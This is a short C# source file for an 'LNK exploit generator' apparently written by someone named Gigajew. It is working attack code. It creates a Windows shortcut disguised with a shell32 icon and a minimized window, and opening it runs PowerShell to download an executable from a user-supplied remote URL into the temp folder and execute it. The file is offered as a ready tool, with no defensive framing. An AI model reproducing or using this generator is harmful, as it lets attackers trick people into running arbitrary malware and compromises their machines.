using IWshRuntimeLibrary;
using System;

namespace lnksploit
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("[ Gigajew's LNK exploit generator ]");
            Console.WriteLine("Usage: lnksploit http://domain.com/filename.exe demo_filename.exe");

            if (args == null)
                return;

            if (args.Length  != 2)
                return;

            CreateShortcut("generated.lnk", "Gigajew's LNK exploit generator", args[1], args[0]);

            Console.WriteLine("Generated exploited LNK file: generated.lnk");
        }

        static void CreateShortcut(string location, string description, string local_filename, string remote_uri)
        {
            WshShell shell = new WshShell();
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(location);
            shortcut.TargetPath = "powershell";
            shortcut.Arguments = $"-command \"$flnm =\\\"$env:TEMP\\{local_filename}\\\";Invoke-WebRequest -Uri \\\"{remote_uri}\\\" -OutFile $flnm;Get-Item -Path $flnm -Stream \\\"Zone.Identifier\\\";& $flnm;\"";
            shortcut.Description = description;
            shortcut.Hotkey = "Ctrl+A";
            shortcut.IconLocation = "shell32.dll,-16744";
            shortcut.WindowStyle =7;
            shortcut.Save();
        }
    }
}
